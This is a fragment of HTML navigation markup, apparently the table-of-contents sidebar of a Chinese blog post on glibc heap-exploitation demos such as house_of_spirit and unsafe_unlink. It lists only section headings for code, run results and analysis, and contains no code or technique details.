class="nav-number">1.2.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果"><span class="nav-number">1.2.2.</span> <span class="nav-text">运行结果:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析："><span class="nav-number">1.2.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-house-of-einherjar-c"><span class="nav-number">1.3.</span> <span class="nav-text">3.house_of_einherjar.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果：-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-large-bin-attack-c"><span class="nav-number">1.4.</span> <span class="nav-text">4.large_bin_attack.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果：-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">运行结果：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-house-of-spirit-c"><span class="nav-number">1.5.</span> <span class="nav-text">5.house_of_spirit.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果：-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-2"><span class="nav-number">1.5.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-unsafe-unlink-c"><span class="nav-number">1.6.</span> <span class="nav-text">6.unsafe_unlink.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果：-4"><span class="nav-number">1.6.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-3"><span class="nav-number">1.6.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-first-fit-c"><span class="nav-number">1.7.</span> <span class="nav-text">7.first_fit.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果：-5"><span class="nav-number">1.7.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-4"><span class="nav-number">1.7.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
